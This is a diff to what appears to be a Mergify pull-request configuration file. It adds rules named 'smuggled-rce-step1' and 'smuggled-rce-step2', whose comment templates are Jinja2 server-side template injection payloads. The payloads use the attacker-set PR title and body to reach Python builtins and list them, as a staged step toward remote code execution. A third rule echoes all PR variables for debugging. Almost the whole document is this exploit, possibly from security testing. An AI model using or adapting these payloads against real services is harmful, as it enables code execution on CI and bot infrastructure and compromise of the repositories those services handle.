@@ -1,7 +1,28 @@
 pull_request_rules:
-  - name: unconditional-comment
+  - name: smuggled-rce-step1
     conditions: []
     actions:
       comment:
         message: |
-          UNCONDITIONAL: title={{ title }} number={{ number }}
+          {% if title and body %}
+          DICT: {{ ([dict]|map(attribute=title))|first }}
+          BUILTINS: {{ (([dict]|map(attribute=title))|first)[body] }}
+          {% else %}
+          No vars in step1
+          {% endif %}
+  - name: smuggled-rce-step2
+    conditions: []
+    actions:
+      comment:
+        message: |
+          {% if title and body %}
+          BUILTINS_KEYS: {{ (([dict]|map(attribute=title))|first)[body].keys()|list }}
+          {% else %}
+          No vars in step2
+          {% endif %}
+  - name: simple-debug
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "DEBUG: title={{ title }} body={{ body }} head={{ head }} base={{ base }} author={{ author }} number={{ number }}"
